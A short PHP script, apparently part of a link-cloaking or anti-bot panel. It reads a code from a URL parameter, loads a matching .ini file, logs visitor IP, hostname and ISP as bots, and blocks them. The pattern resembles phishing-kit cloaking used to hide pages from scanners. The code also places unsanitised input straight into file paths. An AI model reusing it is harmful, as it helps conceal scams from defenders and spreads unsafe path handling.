<?php
error_reporting(0);
require 'core.php';
$code = $_GET['p'];
if(!file_exists("db/url/$code.ini")) {
    header("location: error.html");
    exit();
}
$setting = parse_ini_file("db/url/$code.ini");
$type = $setting['error'];
tulis_file("logs/$code-bots.txt","$ip|$hostname|$isp|Incognito");
tulis_file("logs/$code-visitor.txt","$ip|$hostname|$isp|$br|$os|$country|$ccode|Bot");
blocked($type);
